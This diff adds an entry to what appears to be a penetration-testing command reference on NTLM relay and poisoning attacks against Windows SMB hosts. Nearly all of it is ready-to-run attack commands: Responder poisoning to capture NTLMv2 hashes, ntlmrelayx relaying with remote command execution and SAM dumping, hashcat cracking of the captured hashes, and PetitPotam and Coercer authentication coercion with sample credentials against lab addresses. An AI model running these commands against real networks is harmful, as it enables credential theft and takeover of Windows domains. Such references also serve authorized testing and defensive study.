@@ -1,0 +1,45 @@
+---
+description: |
+  NTLM relay and poisoning attacks — capture NTLMv2 hashes via Responder, relay authentication to other hosts, and coerce authentication from targets.
+commands:
+  - have: No_Creds
+    cmd: |
+      # Start Responder to capture NTLMv2 hashes (LLMNR/NBT-NS poisoning)
+      sudo responder -I eth0
+
+      # NTLM relay — forward captured auth to target machines
+      # Note: requires SMBv1 or SMB signing disabled on target
+      impacket-ntlmrelayx -tf targets.txt -smb2support
+
+      # NTLM relay with command execution
+      impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
+
+      # NTLM relay to get SAM dump
+      impacket-ntlmrelayx -tf targets.txt -smb2support --dump-sam
+
+      # Crack captured NTLMv2 hashes
+      hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
+
+      # Note: if SMBv1 is true and signing is False, you can relay authentication
+      # Check SMB signing: nxc smb 10.10.10.27 --gen-relay-list relay.txt
+  - have: Credentials
+    cmd: |
+      # PetitPotam — coerce NTLM auth from DC (authenticated)
+      python3 PetitPotam.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.21 10.10.10.27
+
+      # Coercer — automated authentication coercion
+      python3 Coercer.py coerce -u sec_user -p 'P@ssw0rd' -d senshu.sh -l 10.10.10.21 -t 10.10.10.27
+phase:
+  - Exploitation
+target_os:
+  - Windows
+services:
+  - SMB
+techniques:
+  - NTLM_Relay
+references:
+  - https://github.com/lgandx/Responder
+  - https://github.com/fortra/impacket
+  - https://github.com/topotam/PetitPotam
+  - https://github.com/p0dalirius/Coercer
+---
